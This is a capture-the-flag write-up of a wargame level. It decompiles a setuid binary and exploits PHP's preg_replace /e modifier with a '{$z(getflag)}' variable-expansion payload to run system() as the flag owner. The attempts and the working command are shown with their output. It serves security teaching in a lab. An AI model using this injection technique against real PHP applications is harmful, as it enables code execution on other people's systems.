What do we have?

	$ ll
	total 24
	dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 ./
	d--x--x--x  1 root    users    340 Aug 30  2015 ../
	-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout*
	-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc*
	-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
	-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php*
	-r-x------  1 level06 level06  675 Apr  3  2012 .profile*

A binary `level06`, with the rights to launch as owner, and a PHP `level06.php` script. Passing the binary to `Ghidra` shows us the following C code:

	undefined4 main(undefined4 param_1,int param_2,char **param_3)

	{
	int iVar1;
	char **__envp;
	char *__ptr;
	__gid_t __rgid;
	__uid_t __ruid;
	char *local_34;
	char *local_30;
	char *local_2c;
	char *local_28;
	undefined4 local_24;
	undefined1 *local_18;
	
	__envp = param_3;
	iVar1 = param_2;
	local_18 = (undefined1 *)&param_1;
	__ptr = strdup("");
	local_28 = strdup("");
	if (*(int *)(iVar1 + 4) != 0) {
		free(__ptr);
		__ptr = strdup(*(char **)(iVar1 + 4));
		if (*(int *)(iVar1 + 8) != 0) {
		free(local_28);
		local_28 = strdup(*(char **)(iVar1 + 8));
		}
	}
	__rgid = getegid();
	__ruid = geteuid();
	setresgid(__rgid,__rgid,__rgid);
	setresuid(__ruid,__ruid,__ruid);
	local_34 = "/usr/bin/php";
	local_30 = "/home/user/level06/level06.php";
	local_24 = 0;
	local_2c = __ptr;
	execve("/usr/bin/php",&local_34,__envp);
	return 0;
	}
	
And running it as is returns an error:

	$ ./level06
	PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

So we'll have to modify the script. Let's `cat` it:

	$ cat level06.php
	#!/usr/bin/php
	<?php
	function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
	function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
	$r = x($argv[1], $argv[2]); print $r;
	?>

If we format it a little bit:

	#!/usr/bin/php
	<?php
		function y($m)
		{
			$m = preg_replace("/\./", " x ", $m);
			$m = preg_replace("/@/", " y", $m);
			return $m;
		}
		function x($y, $z)
		{
			$a = file_get_contents($y);
			$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
			$a = preg_replace("/\[/", "(", $a);
			$a = preg_replace("/\]/", ")", $a);
			return $a;
		}
		$r = x($argv[1], $argv[2]);
		print $r;
	?>

So the script extract a string depending on a certain syntax inside the file given in argument, and gives it as a parameter to the function `y`.

After looking a little bit, the `/e` of `preg_replace` is an infamous security breach of PHP, as it serves to run the second string of the function as PHP code. It got deprecated in PHP 5.5, and entirely removed in PHP 7.0. Luckily, it still works on the version we have here.

	$ php -v
	PHP 5.3.10-1ubuntu3.19 with Suhosin-Patch (cli) (built: Jul  2 2015 15:05:54)
	Copyright (c) 1997-2012 The PHP Group
	Zend Engine v2.3.0, Copyright (c) 1998-2012 Zend Technologies

From this point onward, we struggled a lot... T_T
First, after reading about `/e`, we took a look at the regex preceding it. `(\[x (.*)\])` means that it'll extract all characters following the initial `[x `, up to the last `]` it finds. First guess, give it `getflag`. So we create a file, and write `[x getflag]` inside of it, before launching the binary with the file in parameter.

	$ echo "[x getflag]" > /tmp/e
	$ ./level06 /tmp/e
	getflag

It just printed a string... but the output seems quite good. A few hours later, we learned that the usual way to exploit this, is by giving him `eval('some code there')`, but it isn't applicable in our case, because the script hardcoded the call to `y` in the string, and place our input as parameter. So, we tried to close the call to `y` early, and somehow pass him a call to `system` behind it.

	$ echo "[x \"); system('getflag')]" > /tmp/e
	$ ./level06 /tmp/e
	"); system(\'getflag\')

Unsuccessful attempt. After a few dozen of hours trying plenty of such methods, including some where we were baited by the shell expanding backticks himself, we discovered that such exploit was patched in version 3.5.10, which is exactly the one we have... So, we absolutely have to trigger a call to function inside of the double quoted string. Searching more, we stumbled upon sources stating that variables expansions are still made in such cases. After more fails, we realized that the 2nd argument of the script, that is unused and we ignored, is given as a 2nd parameter to the function `x` as a variable `z`, and that we can call an expansion of it inside of the input.

	$ echo '[x $z]' > /tmp/e
	$ ./level06 /tmp/e abc
	abc

From there, after a few more tries...

	$ echo '[x {$z(getflag)}]' > /tmp/e
	$ ./level06 /tmp/e system
	PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
	Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
	Check flag x Here is your token : wiok45aaoguiboiki2tuin6ub
